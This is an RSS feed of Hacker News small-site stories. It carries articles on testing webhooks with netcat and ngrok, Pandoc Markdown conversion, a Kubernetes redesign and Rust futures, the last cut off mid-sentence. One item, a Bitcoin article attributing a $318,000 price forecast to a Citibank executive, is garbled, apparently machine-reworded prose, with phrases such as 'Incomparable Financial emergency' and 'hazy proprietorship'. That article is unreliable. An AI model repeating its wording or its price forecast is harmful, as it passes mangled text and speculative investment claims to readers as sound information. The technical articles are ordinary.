<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Mon, 30 Nov 2020 20:26:24 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Mon, 30 Nov 2020 20:26:24 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Testing webhooks using netcat and ngrok]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25243963">thread link</a>) | @root993
<br/>
November 29, 2020 | https://www.sankalpjonna.com/posts/testing-webhooks-using-netcat-and-ngrok | <a href="https://web.archive.org/web/*/https://www.sankalpjonna.com/posts/testing-webhooks-using-netcat-and-ngrok">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure id="w-node-184f6be698e4-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5fc36150f7e15501838a699f_3C877AnDdlSJbqfxjZakSrkuQ6NuM0CNdqLoQvUNkeH3u3ScA-BmwT0Qbkb0NsFSDoElP6iR-iS4zhQ-QNa_cEMzBQ0XbHk6xsMTaU1EypUH-XFO7m_sywyykBR2iA_6wc4QMQHL.png" alt=""></p></figure><p>A very common challenge faced by many software products is the need for the application server to communicate with other third party application servers. To be more specific, my application server needs to be notified when a particular event takes place in a 3rd party application server.<br></p><p>For instance, I am currently building a <a href="https://www.delightchat.io/" target="_blank">customer support software</a> in which customer queries can come from various channels of communication including Facebook, Instagram and WhatsApp. This means that if someone sends a message on Facebook messenger, that message has to ultimately reach my application server in some way so I can perform the necessary operations.<br></p><p>The most common way to solve this problem is with the use of webhooks.<br></p><h3><strong>What is a webhook?</strong><br></h3><p>A webhook is nothing but an API end point that is created in your own application server which is made public and it is called by other applications to provide your application with real time updates for various events.<br></p><p>The product that I am currently building integrates with Shopify and every time somebody places an order on a merchants Shopify store, my application needs to be notified in real time so that the order can be indexed in my database and my application then has the capability to query all orders placed by a particular user.<br></p><p>To solve this, I would have to create an API end point on my server in the form of <em>/webhooks/shopify/orders/create</em> and register this URL with Shopify. Whenever Shopify receives a new order in their system, their server will fire this URL along with the order data.<br></p><h3><strong>How to inspect a webhook?</strong><br></h3><p>Since a webhook is called from a 3rd party server that is out of your control, you have no way of knowing what kind of data will be sent in the webhook unless you actually create an API, host it somewhere that is public and register the endpoint with the 3rd party software. <br></p><p>If this seems like a lot of work just to view the contents of a webhook, products like <a href="https://requestbin.com/" target="_blank">requestbin</a> and <a href="https://beeceptor.com/" target="_blank">beecepter</a> were built exactly for this purpose. You can get a free endpoint from these products and register it in the 3rd party software after which you can trigger the event you are looking for and view the contents of the request on their dashboard.<br></p><p>However I believe in simplicity and these services come with their own set of constraints. So after a little bit of research I found that the netcat utility that is installed by default In most UNIX based machines solves this problem quite elegantly.<br></p><h5>Using netcat to inspect a webhook<br></h5><p>In the most simplest form, you can set up a webhook listener with a simple terminal command<br></p><p>&lt;p&gt;CODE:&nbsp;https://gist.github.com/sankalpjonn/b0a8efaad418feeae02e4285582e2ce5.js&lt;/p&gt;<br></p><p>This command will listen for any requests coming on the port 3000 and display it on the terminal itself. Let us try it out by entering <a href="http://localhost:8000/my/webhook/path" target="_blank">http://localhost:3000/my/webhook/path</a> on the browser and see what happens.<br></p><figure id="w-node-060a8fc15179-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5fc34225f58539412e8fad89_gN3PHr5rIsoV-eU02OEnVfFRqw10WcvJV73B2eTxDnL1IanCGiOyMGuomBwxTo7LJV2QmqfyFgSYRT5cNlIIK-YsdFC3Pt8k4U_vmrVt65rlvqVDok1o44yR-_rKqVr0YGLXKV8U.png" alt=""></p><figcaption>Inspecting the contents of a http request<br></figcaption></figure><p>The output on the terminal contains the entire http request that was received by localhost:3000 including the http method, headers and content. But there are two clear problems here:<br></p><ul role="list"><li>The browser keeps waiting for a response from the netcat server which is never received, so it eventually times out.</li><li>The netcat server displays the webhook request and then shuts down after which it will no longer accept any more requests unless you re-run the command.<br></li></ul><p>Both of these problems have simple solutions. Let’s go through them in order.<br></p><h5><strong>Returning a response</strong> <br></h5><p>One can easily create a simple HTTP message and return that as the response to the requests made to this netcat server. Here is how you do it:<br></p><p>Create a file called response.txt with these contents.<br></p><p>&lt;p&gt; CODE:&nbsp;https://gist.github.com/sankalpjonn/0753a1ac3a4442eedb3c0f811740e4ec.js &lt;/p&gt;<br></p><p>Echo the contents of this file and pipe the netcat command to it.<br></p><p>&lt;p&gt; CODE:&nbsp;https://gist.github.com/sankalpjonn/5fffa3d857bab441dd85fad1061da384.js &lt;/p&gt;<br></p><p>Now upon hitting localhost:3000 on your browser, you will receive a response in the browser.</p><figure id="w-node-7c8443ed0138-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5fc342e7f19477bb7649ae48_Wxi5VFUp0fleE1u1NrVneah1s_TxVNEXXKaXw092dB-lfc3M7ljNOgoTIp0uvn8WiEZT071uf0P4vNbTQcrknLXckCJGsShTHzmMEoxUJ39O9rvCIfqbbUDtXnBSH67vAy2-X6wv.png" alt=""></p><figcaption>netcat server with response</figcaption></figure><p>‍</p><h5>Running the netcat server in a loop<br></h5><p>To prevent the netcat server from shutting down after a request is received, all we have to do is run the commands in a loop. This can be done with a small modification to the above command.</p><p>‍<br>&lt;p&gt; CODE:&nbsp;https://gist.github.com/sankalpjonn/eb8413365d91e566c66e456adffbf6c3.js &lt;/p&gt;</p><p>Now when you make a request to localhost:3000, the request content will be displayed on the terminal and a response will be sent to the client making the request but the netcat server will continue to run and accept new requests.<br></p><p>To demonstrate the fact that you can inspect any http request using this setup, let us make another request to localhost:3000 but this time use a PUT method with some query parameters, some headers and some data using cURL.</p><p>&lt;p&gt;&nbsp;CODE:&nbsp;https://gist.github.com/sankalpjonn/1468715b5fbe8c97bae095e874200cef.js &lt;/p&gt;<br></p><figure id="w-node-e056beb644f0-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5fc343941c29737cf9f65b15_hq7ITM8kEJRvb5wm5yDYvA-sno9OUgLRFw_tb3r3OKuL1PpeAfl68wPSHrhu4YTTmI79qNO_viY6rGyqoLk5c15mO5J6syZOBRCG1WUCyHs2-QHyP-a0e4KIxEpaiNsa80HJ9_TX.png" alt=""></p><figcaption>Viewing the contents of a PUT request with headers, query params and body</figcaption></figure><p>‍</p><p>Great! we can now inspect any type of webhook that is made to localhost:3000.<br></p><h3>Making your webhook public using ngrok<br></h3><p>Now that we have a fake server setup using netcat that is capable of accepting requests, displaying their content and sending back a valid response, all we need is a method to expose this server to the public internet. <br></p><p>This is because, we need to register this webhook on some third party software like Shopify and that cannot be done unless the URL is publicly accessible. <br></p><p>Fortunately, this can be done with a single command using ngrok. Ngrok is a very nifty tool that lets you expose a service running on localhost to the public internet by generating a temporary URL that is made public. You can also get a permanent URL by signing up for their paid plan.<br></p><p>After installing ngrok from <a href="https://ngrok.com/download" target="_blank">here</a> and unzipping it as shown in the description, all you have to do is run this command on a new terminal window while your netcat server is still running.</p><p>&lt;p&gt; CODE:&nbsp;https://gist.github.com/sankalpjonn/4c4018e45ed36130521bcfd63a89b0c3.js &lt;p&gt;<br></p><p>You instantly get a http and https endpoint that routes traffic from the public internet to localhost:3000. You can try it out by coping the generated URL and pasting it in your browser.<br></p><figure id="w-node-c3deabacf619-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5fc3644d77f60530b57eb061_dsKbmpkfNStyhz9XbENYJpmZrvkI76nl6XvFPiSQ_3fxKmgjrKEwbuf3rIpBySPTELVe6G8DD1Jfoe55tz9WyrIp0tXvT-z1xF1S1IZY24UbahJfeQ7W6cQMlQzkcYSUTqJv0XcT.png" alt=""></p><figcaption>get the public URL&nbsp;from here</figcaption></figure><figure id="w-node-e545581c77d3-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5fc344670af890c127167066_2yKt6iyvATWXH1MMlAHioMB_5aCTs6yjWKvas0cBdjEr01JKWQUSKVW37o9pUZY2Fw1oCYWbFm-2qhJaoU1wtefBvQ84u9cJBqNzyZTH8onY3_Lnn0h3kPKDvMP4UOS_UtmJmOoD.png" alt=""></p><figcaption>Making a request using the public URL</figcaption></figure><p>‍</p><p>And it works!<br></p><h3>Summary</h3><p>A webhook can be tested by running just two simple terminal commands on separate terminal windows. </p><p>&lt;p&gt; CODE:&nbsp;https://gist.github.com/sankalpjonn/a3f41a14f7ea1d386423fdb73193f65f.js&lt;/p&gt;</p><p>You can now test your webhooks with the public URL&nbsp;derived from ngrok and registering this URL&nbsp;in the 3rd party software that will be calling the webhook.</p><h3>Closing notes<br></h3><p>As I mentioned before, for those of you who believe that using an existing service that was built for this very purpose is better, I would highly recommend <a href="https://beeceptor.com/" target="_blank">beeceptor</a>. <br></p><p>You can view all your requests on a dashboard like this.</p><figure id="w-node-4211e4369e4b-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5fc344ae3677d6cf3746c74d_Vj0hedFYlVuj06uI7RCNsm38rnBwc4TGHw-A8ovEoPNGrysxauEJhIJq98e7Nn0oh8Wa_1WQmKRDGK7c8ib226ZWSwZYdzLrGRnfWZr_P6QWkfsaS9LI7FMEjhdOKA81aJIrkeBm.png" alt=""></p><figcaption>Beecepter dashboard</figcaption></figure><p>‍</p><p>The downside is that if you don’t want to pay for this service, the free plan has many constraints, once of which is that if you refresh this page, your previous request data is lost, so you can use this only as a one time thing.<br></p><p>The reason I like to go with the netcat + ngrok method is because the whole thing is completely in my control and it always feels good to hack something together of your own rather than use an existing service.</p></div></div>]]>
            </description>
            <link>https://www.sankalpjonna.com/posts/testing-webhooks-using-netcat-and-ngrok</link>
            <guid isPermaLink="false">hacker-news-small-sites-25243963</guid>
            <pubDate>Sun, 29 Nov 2020 09:13:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Convert Markdown to HTML with Pandoc]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25243905">thread link</a>) | @arthurk
<br/>
November 29, 2020 | https://www.arthurkoziel.com/convert-md-to-html-pandoc/ | <a href="https://web.archive.org/web/*/https://www.arthurkoziel.com/convert-md-to-html-pandoc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        <time datetime="2020-11-29">November 29, 2020</time>
<p>In this post I’ll describe how to use <a href="">Pandoc</a> to convert Markdown to a full HTML page (including header/footer).</p>
<p>The Pandoc version used for the examples below is 2.11.2.</p>
<h2 id="what-is-pandoc">What is Pandoc?</h2>
<p>Pandoc is an open-source document converter that is written in Haskell. It was initially released in 2006 and has been under active development since then.</p>
<p>The goal of Pandoc is to convert a document from one markup format to another. It distinguishes between input formats and output formats. As of writing this it supports <a href="https://pandoc.org/MANUAL.html#input-formats">38 input formats</a> and <a href="https://pandoc.org/MANUAL.html#output-formats">59 output formats</a>.</p>
<p>In this post we’ll use Markdown as an input format and HTML as an output format.</p>
<h2 id="preparing-the-html-template">Preparing the HTML template</h2>
<p>To generate a full HTML page we have to use Pandoc’s standalone mode which will use a <a href="https://pandoc.org/MANUAL.html#templates">template</a> to add header and footer.</p>
<p>Pandoc ships with a default template, if you wish to use that skip this section and omit the <code>--template</code> argument.</p>
<p>The template we’ll use is this (save it to <code>template.html</code>):</p>
<pre><code>&lt;!doctype html&gt;
&lt;html lang="en"&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;meta name="date" content='$date-meta$'&gt;
    &lt;title&gt;$title$&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;p&gt;Date: $date$&lt;/p&gt;
$body$
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>Pandoc’s template variables can have <a href="https://pandoc.org/MANUAL.html#interpolated-variables">different formats</a>, the one we’re using here start and end with a dollar sign:</p>
<ul>
<li><code>$date$</code>: A date in a parsable format. See the <a href="https://pandoc.org/MANUAL.html#variables-set-automatically">date-meta docs</a> for a list of recognized formats for the <code>date</code> variable. We use this to show when the document was created</li>
<li><code>$date-meta$</code>: The <code>date</code> parsed to ISO 8601 format. This is automatically done</li>
<li><code>$title$</code>: The document title</li>
<li><code>$body$</code>: The document body in HTML (the converted Markdown)</li>
</ul>
<p>We only need to set the <code>date</code> and <code>title</code> in the Markdown document via a metadata block.</p>
<h2 id="writing-the-markdown-file">Writing the Markdown file</h2>
<p>Create a Markdown file <code>doc.md</code> with the following content:</p>
<pre><code>---
title: My Document
date: September 22, 2020
---

## Test
some text</code></pre>
<p>The beginning of the document is the metadata block with required <code>date</code> and <code>title</code> variables mentioned above.</p>
<p>Several Markdown variants are <a href="https://pandoc.org/MANUAL.html#Markdown-variants">supported</a> such as GitHub-Flavored markdown. This example uses <a href="https://pandoc.org/MANUAL.html#pandocs-markdown">Pandoc’s extended markdown</a> which is the default input for files with the <code>md</code> extension.</p>
<h2 id="converting-the-document">Converting the document</h2>
<p>Run the following command to generate the HTML page:</p>
<pre><code>pandoc --standalone --template template.html doc.md</code></pre>
<p>Pandoc will try to guess the input format from the file extension (<code>.md</code> will use the Markdown input format) and output it to HTML (the default output format).</p>
<p>The output will be printed to the terminal:</p>
<pre><code>&lt;!doctype html&gt;
&lt;html lang="en"&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;meta name="date" content='2020-09-22'&gt;
    &lt;title&gt;My Document&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;p&gt;Date: September 22, 2020&lt;/p&gt;
&lt;h2 id="test"&gt;Test&lt;/h2&gt;
&lt;p&gt;some text&lt;/p&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>To save the document to a file we can either redirect stdout or use the <code>-o</code> argument:</p>
<pre><code>pandoc --standalone --template template.html doc.md -o doc.html</code></pre>
<h2 id="conclusion">Conclusion</h2>
<p>In this example we’ve converted Markdown to a standalone HTML page that is using a custom template.</p>
<p>This was just a simple example of what Pandoc is capable to do. The standalone mode coupled with the bundled default templates makes it easy to generate a wide variety of outputs such as HTML presentations, Jupyter notebooks or PDF documents.</p>
    </article></div>]]>
            </description>
            <link>https://www.arthurkoziel.com/convert-md-to-html-pandoc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25243905</guid>
            <pubDate>Sun, 29 Nov 2020 08:55:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Citibank Executive Says Bitcoin Will Trade at $318,000 by End of 2021]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25243828">thread link</a>) | @rajeshbotsfolio
<br/>
November 29, 2020 | https://botsfolio.com/crypto-bot/bitcoin-citibank/ | <a href="https://web.archive.org/web/*/https://botsfolio.com/crypto-bot/bitcoin-citibank/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                     <p>
                        “Bitcoin will see huge price swings before finally settling at the predicted price” Fitzpatrick, MDCitibank.
                     </p>

                     

               
                        <h3>Comparative Trends</h3>
                        <p>
                            Writing in a report named, Bitcoin: 21st Century Gold, Fitzpatrick makes the flood contention 
                            for bitcoin. He says the computerized gold’s present direction gives off an impression of being like that of gold 
                            during the 1970s. 
                        </p>

                        <p>
                            Before basic changes were executed in the mid-1970s, gold had gone through 50 years of exchanging 
                            the $20-$35 territory. Notwithstanding, after changes were initiated gold flooded. It as of late contacted another 
                            record-breaking high in Augustprior to settling at just shy of $1,900 per ounce. 
                        </p>
                             
                        <p>
                            As per one report that examined 
                            Fitzpatrick’s paper, it is this “auxiliary change in the advanced money related system that introduced a universe of 
                            monetary indiscipline, deficiencies, and expansion.” Therefore, the Citibank manager contends that bitcoin, which 
                            went to the front in the fallout of the “Incomparable Financial emergency” of 2008-2009, will undoubtedly have a 
                            comparative run. 
                        </p>
               
                        <p>
                            With the Covid-19 pandemic actually draining economies around the globe, governments will keep reacting to the emergency by printing more cash. 
                            This thuslywill profit place of refuge resources that perform well in inflationary periods. 
                        </p>
               
                        <h3>Bitcoin Better Than Gold</h3>
               
                        <p>
                            In any case, Fitzpatrick clarifies that albeit gold is required to profit by the storm of new cash entering dissemination, the 
                            valuable metal has novel constraints that don’t appear to distress bitcoin. In his review, Fitzpatrick notes: 
                        </p><p>
                            Gold has limitations, for example, stockpiling, non-compact, and might be even called ‘the previous news’ regarding a 
                            monetary fence. Bitcoin is the new gold. To help this view, the Citibank supervisor refers to a portion of bitcoin’s 
                            key credits which incorporate the advanced cash’s “restricted gracefully, 
                            simplicity of development across fringes, and hazy proprietorship.” Consequently, Fitzpatrick accepts more 
                            speculators will pick bitcoin over gold thus. 
                        </p>

                        <p>
                            In the interim, Fitzpatrick predicts that bitcoin will be exposed to 
                            more administrative limitations going ahead. Be that as it may, dissimilar to other computerized monetary standards, 
                            for example, national bank advanced monetary standards (CBDCs), bitcoin can’t be seized, thus making it a safer 
                            resource.
                        </p>
                    </div></div>]]>
            </description>
            <link>https://botsfolio.com/crypto-bot/bitcoin-citibank/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25243828</guid>
            <pubDate>Sun, 29 Nov 2020 08:37:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A better Kubernetes from the ground up]]>
            </title>
            <description>
<![CDATA[
Score 22 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25243159">thread link</a>) | @mr-karan
<br/>
November 28, 2020 | https://blog.dave.tf/post/new-kubernetes/ | <a href="https://web.archive.org/web/*/https://blog.dave.tf/post/new-kubernetes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<div>
		<p><span>Written by</span>
        David Anderson
        <br>
        <span>on&nbsp;</span><time datetime="2020-11-28 00:00:00 +0000 UTC">November 28, 2020</time>
</p>
		


		

		<p>Recently I had a chat with the excellent <a href="https://timewitch.net/">Vallery Lancey</a>, about Kubernetes. Specifically, what we would do differently if we built something new, from the ground up, with no regard for compatibility with Kubernetes. I found that conversation so stimulating that I feel the need to write things down, so here we are.</p>

<p>Before we get started, I want to stress a few things.</p>

<ul>
<li>This is not a fully formed design. Some of these things may not work at all, or require significant redesign. Each section is one random piece of the entire puzzle.</li>
<li>These are not solely my ideas. Some I <em>think</em> are original, but like many things in the Kubernetes community it’s the product of collective thinking. I know at least <a href="https://timewitch.net/">Vallery</a> and <a href="https://twitter.com/maisem_ali">Maisem Ali</a> have influenced my thinking at one time or another, and I’m forgetting many more. If you like an idea, it was a group effort. If you hate it, it’s entirely mine.</li>
<li>Some of these things are polarizing. I’m designing something that makes <em>me</em> happy.</li>
</ul>

<h2 id="guiding-principles">Guiding principles</h2>

<p>My experience of Kubernetes comes from two very different places: authoring <a href="https://www.metallb.org/">MetalLB</a> for bare metal clusters, and operating a large fleet of clusters-as-a-service in <a href="https://cloud.google.com/kubernetes-engine">GKE SRE</a>. Both of these taught me that Kubernetes is extremely complex, and that most people who are trying to use it are not prepared for the sheer amount of work that lies between the marketing brochure and the system those brochures promise.</p>

<p>MetalLB taught me that it’s not possible to build robust software that integrates with Kubernetes. I think MetalLB makes a damn good go of it, but Kubernetes still makes it far too easy to construct broken configurations, and far too hard to debug them. GKE SRE taught me that even the foremost Kubernetes experts cannot safely operate Kubernetes at scale. (Although GKE SRE does a spectacular job with the tools they’re given.)</p>

<p>Kubernetes is the C++ of orchestration software. Immensely powerful, includes all the features, looks deceptively simple, and <em>will</em> hurt you repeatedly until you join its priesthood and devote your life to its mysteries. And even then, the matrix of possible ways to configure and deploy it is so large that you’re never on firm footing.</p>

<p>Continuing that analogy, my guide star is Go. If Kubernetes is C++, what would the Go of orchestration systems look like? Aggressively simple, opinionated, grown slowly and warily, and you can learn it in under a week and get on with what you were actually trying to accomplish.</p>

<p>With that, let’s get going. Starting with Kubernetes, and with a license to completely and utterly break compatibility, what would I do?</p>

<h2 id="mutable-pods">Mutable pods</h2>

<p>In Kubernetes, pods are mostly (but not entirely) immutable after creation. If you want to change a pod, you don’t. Make a new one and delete the old one. This is unlike most other things in Kubernetes, which are mostly mutable and gracefully reconcile towards the new spec.</p>

<p>So, I’m going to make pods be not special. Make them entirely read-write, and reconcile them like you would any other object.</p>

<p>The immediately useful thing I get from that is in-place restarts. If scheduling constraints and resource allocations haven’t changed, guess what? SIGTERM runc, restart runc with different parameters, and you’re done. Now pods look like regular old systemd services, that can move between machines <em>if necessary</em>.</p>

<p>Note that this doesn’t require doing mutability at the runtime layer. If you change a pod definition, it’s still mostly fine to terminate the container and restart it with a new configuration. The pod is still holding onto the resource reservation that got it scheduled onto this machine, so conceptually it’s equivalent to <code>systemctl restart blah.service</code>. You could try to be fancy and make some operations actually update in place at the runtime level as well, but don’t have to. The main benefit is decoupling scheduling, pod lifetime, and lifetime at the runtime layer.</p>

<h2 id="version-control-all-the-things">Version control all the things</h2>

<p>Sticking at the pod layer for a bit longer: now that they’re mutable, the next obvious thing I want is rollbacks. For that, let’s keep old versions of pod definitions around, and make it trivial to “go back to version N”.</p>

<p>Now, a pod update looks like: write an updated definition of the pod, and it updates to match. Update broken? Write back version N-1, and you’re done.</p>

<p>Bonus things you get from this: a diffable history of what happened to your cluster, without needing GitOps nonsense. By all means keep the GitOps nonsense if you want, it has benefits, but you can answer a basic “what changed?” question using only data in the cluster.</p>

<p>This needs a bit more design. In particular, I want to separate out external changes (human submits a new pod) from mechanical changes (some internals of k8s alter a pod definition). I haven’t thought through how to encode both those histories and make both accessible to operators and automation. Maybe it could also be completely generic, wherein a “changer” identifies itself when submitting a new version, and you can then query for changes by or excluding particular changers (think similar to how label queries work at the minute). Again, more design needed there, I just know that I want versioned objects with an accessible history.</p>

<p>We’ll need garbage collection eventually. That said, changes to single pods should delta-compress really well, so my default would be to just keep everything until it becomes a truly dumb amount of data, and figure something out at that point. Keeping everything also acts as a useful mild pressure to avoid “death by a thousand changes” in the rest of the system. Prefer to have fewer, more meaningful changes over a flurry of control loops each changing one field in pursuit of convergence.</p>

<p>Once we have this history, we can do some neat minor things too. For example, the node software could keep container images for the last N versions pinned to the machine, so that rollbacks are as fast as they can possibly be. With an accessible history, you can do this more precisely than “GC older than 30 days and hope”. Generalizing, all the orchestration software can use older versions as GC roots for various resources, to make rollbacks faster. Rollbacks being the primary way of ending outages, this is a very valuable thing to have.</p>

<h2 id="replace-deployment-with-pinneddeployment">Replace Deployment with PinnedDeployment</h2>

<p>This is a short section to basically say that <a href="https://timewitch.net/">Vallery</a> knocked it out of the park with her <a href="https://timewitch.net/post/2019-12-30-pinneddeployments/">PinnedDeployment</a> resource, which lets operators explicitly control a rollout by tracking 2 versions of the deployment state. It’s a deployment object designed by an SRE, with a crisp understanding of what SREs want in a deployment. I love it.</p>

<p>This combines super well with the versioned, in-place pod updates above, and I really don’t have anything to add. It’s clearly how multi-pod things should work. There’s probably some tweaking required to adapt from the Kubernetes-constrained world to this new wonderful unconstrained universe, but the general design is perfect.</p>

<h2 id="explicit-orchestration-workflows">Explicit orchestration workflows</h2>

<p>The biggest issue I have with the “API machinery” bits of Kubernetes is the idea of orchestration as a loose choreography of independent control loops. On the surface, this seems like a nice idea: you have dozens of little control loops, each focused on doing one small thing. When combined in a cluster, they indirectly cooperate with each other to push the state forward and converge on the desired end state. So, what’s the problem?</p>

<p>The problem is that it’s entirely impossible to debug when it goes wrong. A typical failure mode in Kubernetes is that you submit a change to the cluster, then repeatedly refresh waiting for stuff to converge. When it doesn’t… Well, you’re screwed. Kubernetes doesn’t know the difference between “the system has converged successfully” and “a control loop is wedged and is blocking everything else.” You can hope that the offending control loop posted some events to the object to help you, but by and large they don’t.</p>

<p>At which point your only option is to cat the logs of every control loop that might be involved, looking for the one that was wedged. You can make this a bit faster if you have intimate knowledge of all the control loops and what each one does, because that lets you infer from the object’s current state which loop might be trying to run right now.</p>

<p>The key thing to notice here is that the complexity has been shifted from the designer of the control loop to the cluster operator. It’s easy (though not trivial) to make a control loop that does a dinky little thing in isolation. But to operate a cluster with dozens of these control loops requires the operator to assimilate the behavior of all of them, their interactions with each other, and try to reason about an extremely loosely coupled system. This is a problem because you have to write and test the control loop once, but work with it and its bugs many more times. And yet, the bias is to simplify the thing you only do once.</p>

<p>To fix this, I would look to systemd. It solves for a similar lifecycle problem: given a current state and a target, how do you get from A to B? The difference is that in systemd, the steps and their dependencies are made explicit. You <em>tell</em> systemd that your unit is a required part of <code>multi-user.target</code> (aka “normally-booted happy system”), that it must run after filesystems have been mounted, but before networking it brought up, and so forth. You can also depend on other concrete parts of the system, for example to say that your thing needs to run whenever sshd is running (sounds like a sidecar, right?).</p>

<p>The net result of this is that systemd can tell you precisely what piece of the system malfunctioned, or is still working on its thing, or failed a precondition. It can also print you a graph of the system’s boot process, and analyze it for things like “what’s the long pole of bootup?”</p>

<p>I want to steal all this wholesale, and plop it into my cluster orchestration …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.dave.tf/post/new-kubernetes/">https://blog.dave.tf/post/new-kubernetes/</a></em></p>]]>
            </description>
            <link>https://blog.dave.tf/post/new-kubernetes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25243159</guid>
            <pubDate>Sun, 29 Nov 2020 05:35:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Futures Explained in 200 Lines of Rust]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25242849">thread link</a>) | @rustshellscript
<br/>
November 28, 2020 | https://cfsamson.github.io/books-futures-explained/introduction.html | <a href="https://web.archive.org/web/*/https://cfsamson.github.io/books-futures-explained/introduction.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
        <!-- Provide site root to javascript -->
        

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        

        <!-- Set the theme before any content is loaded, prevents flash -->
        

        <!-- Hide / unhide sidebar before it is displayed -->
        

        <nav id="sidebar" aria-label="Table of contents">
            
            
        </nav>

        <div id="page-wrapper">

            <div class="page">
                
                
                

                
                
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                

                <div id="content">
                    <main>
                        
<p>This book aims to explain Futures in Rust using an example driven approach,
exploring why they're designed the way they are, and how they work. We'll also
take a look at some of the alternatives we have when dealing with concurrency
in programming.</p>
<p>Going into the level of detail I do in this book is not needed to use futures
or async/await in Rust. It's for the curious out there that want to know <em>how</em>
it all works.</p>
<h2><a href="#what-this-book-covers" id="what-this-book-covers">What this book covers</a></h2>
<p>This book will try to explain everything you might wonder about up until the
topic of different types of executors and runtimes. We'll just implement a very
simple runtime in this book introducing some concepts but it's enough to get
started.</p>
<p><a href="https://github.com/stjepang">Stjepan Glavina</a> has made an excellent series of
articles about async runtimes and executors, and if the rumors are right there
is more to come from him in the near future.</p>
<p>The way you should go about it is to read this book first, then continue
reading the <a href="https://stjepang.github.io/">articles from stejpang</a> to learn more
about runtimes and how they work, especially:</p>
<ol>
<li><a href="https://stjepang.github.io/2020/01/25/build-your-own-block-on.html">Build your own block_on()</a></li>
<li><a href="https://stjepang.github.io/2020/01/31/build-your-own-executor.html">Build your own executor</a></li>
</ol>
<p>I've limited myself to a 200 line main example (hence the title) to limit the
scope and introduce an example that can easily be explored further.</p>
<p>However, there is a lot to digest and it's not what I would call easy, but we'll
take everything step by step so get a cup of tea and relax.</p>
<p>I hope you enjoy the ride.</p>
<blockquote>
<p>This book is developed in the open, and contributions are welcome. You'll find
<a href="https://github.com/cfsamson/books-futures-explained">the repository for the book itself here</a>. The final example which
you can clone, fork or copy <a href="https://github.com/cfsamson/examples-futures">can be found here</a>. Any suggestions
or improvements can be filed as a PR or in the issue tracker for the book.</p>
<p>As always, all kinds of feedback is welcome.</p>
</blockquote>
<h2><a href="#reader-exercises-and-further-reading" id="reader-exercises-and-further-reading">Reader exercises and further reading</a></h2>
<p>In the last <a href="https://cfsamson.github.io/books-futures-explained/conclusion.html">chapter</a> I've taken the liberty to suggest some
small exercises if you want to explore a little further.</p>
<p>This book is also the fourth book I have written about concurrent programming
in Rust. If you like it, you might want to check out the others as well:</p>
<ul>
<li><a href="https://cfsamson.gitbook.io/green-threads-explained-in-200-lines-of-rust/">Green Threads Explained in 200 lines of rust</a></li>
<li><a href="https://cfsamson.github.io/book-exploring-async-basics/">The Node Experiment - Exploring Async Basics with Rust</a></li>
<li><a href="https://cfsamsonbooks.gitbook.io/epoll-kqueue-iocp-explained/">Epoll, Kqueue and IOCP Explained with Rust</a></li>
</ul>
<h2><a href="#credits-and-thanks" id="credits-and-thanks">Credits and thanks</a></h2>
<p>I'd like to take this chance to thank the people behind <code>mio</code>, <code>tokio</code>,
<code>async_std</code>, <code>futures</code>, <code>libc</code>, <code>crossbeam</code> which underpins so much of the
async ecosystem and and rarely gets enough praise in my eyes.</p>
<p>A special thanks to <a href="https://twitter.com/jonhoo">jonhoo</a> who was kind enough to
